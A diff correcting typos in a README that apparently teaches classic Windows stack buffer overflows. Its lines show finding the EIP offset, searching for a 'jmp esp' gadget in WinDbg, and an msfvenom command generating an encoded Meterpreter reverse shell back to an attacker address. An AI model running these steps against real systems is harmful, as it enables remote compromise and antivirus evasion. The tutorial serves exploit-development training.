@@ -32,7 +32,7 @@ Usage ./S2FindOffset.py {IP} {Port}<br/>
 <br/>
 From our debugger, we see that the EIP is overwritten by 33794332
 ![alt tag](https://github.com/ZeusBanda/Classic-Buffer-Overflows/blob/main/WinDbg-Images/S2EIP.png)<br/>
-Next we use find the offset that will overwrite the EIP by using the following command<br/>
+Next we find the offset that will overwrite the EIP by using the following command<br/>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfvenom-pattern_offset -l {data} -q {eip}<br/>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; where -l {data} is the amount of data that caused the application to crash and -q {eip} is the area we want to overwrite.
 ![alt tag](https://github.com/ZeusBanda/Classic-Buffer-Overflows/blob/main/WinDbg-Images/S2Offset.png)<br/>
@@ -81,17 +81,17 @@ When we find a potentially suitable module, we go to our debugger and find the a
 The first command gives us the boundary of the module. This boundary limits our search scope for our jump command.<br/>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lm m vulnapp1<br/>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;where lm list the modules and m specifies a pattern that must match our query of vulnapp1.<br/>
-The seccond command helps us achieve this.<br/>
+The second command helps us achieve this.<br/>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s -b 14800000 14816000 0xff 0xe4<br/>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This command searches for ffe4 from 14800000 14816000 displaying the (-b)bytes.<br/>
-In this case, since we are jumnping to the ESP we are searching for jmp esp which is ff e4<br/>
+In this case, since we are jumping to the ESP we are searching for jmp esp which is ff e4<br/>
 But a different application might require a different jump code<br/>
-Which are here for your convinience. <br/>
+Which are here for your convenience. <br/>
 ![alt tag](https://github.com/ZeusBanda/Classic-Buffer-Overflows/blob/main/WinDbg-Images/S4JMPCodes.png)<br/>
 Now we can generate out shellcode using the following command:<br/>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.191 LPORT=443 EXITFUNC=thread -f python –e x86/shikata_ga_nai -b "\x00"<br/>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;where we use -p for the platform we are attacking and payload we are using<br/>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EXITFUNC=thread becuase we dont want to close the vulnerable app when we close the shell<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EXITFUNC=thread because we dont want to close the vulnerable app when we close the shell<br/>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-e x86/shikata_ga_nai to encode the shellcode to either evade AV or avoid bad characters<br/>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-b lets you specify what the bad characters are.<br/>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This is shown below.<br/>
